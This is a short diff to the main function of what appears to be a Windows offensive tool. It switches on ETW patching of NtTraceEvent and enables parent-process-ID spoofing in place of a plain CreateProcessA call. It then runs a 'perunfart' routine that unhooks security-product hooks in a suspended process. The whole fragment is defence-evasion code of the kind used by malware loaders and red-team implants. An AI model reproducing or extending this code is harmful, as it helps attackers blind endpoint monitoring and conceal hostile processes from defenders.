@@ -31,19 +31,19 @@ int main(int argc, char* argv[])
 		return 0;
 	}
 
-	//printf("/////////////////////////////////////////////// Patching NtTraceEvent //////////////////////////////////\n");
+	printf("/////////////////////////////////////////////// Patching NtTraceEvent //////////////////////////////////\n");
 	etwPatch();
 
 	/// <summary>
 	/// if you wish to use ppid spoofing uncomment the ppid function below and comment CreateProcess function in the UNHOOKING part
 	/// </summary>
-	/*printf("\n/////////////////////////////////////////////// PPID Spoofing //////////////////////////////////\n");
-	pi = ppid(attributeSize, six);*/
+	printf("\n/////////////////////////////////////////////// PPID Spoofing //////////////////////////////////\n");
+	pi = ppid(attributeSize, six);
 	
 	printf("\n/////////////////////////////////////////////// UNHOOKING //////////////////////////////////\n");
 	/// Use this CreateProcess function if you don't want ppid spoofing
-	if (CreateProcessA(0, (LPSTR)"notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, (LPSTARTUPINFOA)&si, &pi) == 0)
-		printf("Failed to create process. Error code: %u", GetLastError()); 
+	/*if (CreateProcessA(0, (LPSTR)"notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, (LPSTARTUPINFOA)&si, &pi) == 0)
+		printf("Failed to create process. Error code: %u", GetLastError());*/ 
 	printf("[+] Process created in suspended state with pid: %d\n", pi.dwProcessId);
 	perunfart(pi.hProcess);
 
